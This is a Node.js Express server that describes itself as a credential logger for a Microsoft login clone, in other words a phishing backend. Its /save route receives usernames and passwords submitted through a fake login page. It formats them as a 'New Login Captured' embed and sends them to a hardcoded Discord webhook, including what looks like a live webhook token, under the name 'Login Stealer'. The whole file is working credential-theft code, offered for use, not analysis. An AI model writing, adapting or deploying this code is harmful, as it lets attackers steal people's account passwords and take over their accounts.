const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

// === CONFIGURE YOUR DISCORD WEBHOOK HERE ===
const DISCORD_WEBHOOK_URL = "hhttps://discordapp.com/api/webhooks/1494067903073353827/2uJS7jmZhEZu0-2S4YVEl2nteIT7-vbcdqixpU7qDfnkgsMyJCiPWtqJOakKZLvIzjyq";
// ============================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Test route
app.get('/', (req, res) => {
    res.send('✅ Credential logger backend is running! (Discord webhook mode)');
});

app.post('/save', async (req, res) => {
    try {
        const { username, password, timestamp } = req.body;

        if (!username || !password) {
            return res.status(400).send('Missing username or password');
        }

        const time = timestamp || new Date().toISOString();

        // Create a nice embed for Discord
        const embed = {
            title: "🔐 New Login Captured",
            color: 0xFF0000,
            fields: [
                { name: "Username / Email", value: `\`${username}\``, inline: false },
                { name: "Password", value: `\`${password}\``, inline: false },
                { name: "Time", value: time, inline: false }
            ],
            footer: { text: "Microsoft Login Clone" },
            timestamp: new Date().toISOString()
        };

        // Send to Discord webhook
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: "Login Stealer",
                embeds: [embed]
            })
        });

        if (response.ok) {
            console.log(`✅ Sent to Discord: ${username}`);
            res.send('OK');
        } else {
            console.error('Discord webhook failed:', response.status);
            res.status(500).send('Webhook error');
        }
    } catch (error) {
        console.error('Error sending to Discord:', error);
        res.status(500).send('Server error');
    }
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Backend running on http://${HOST}:${PORT}`);
    console.log(`📡 Discord webhook is configured`);
});
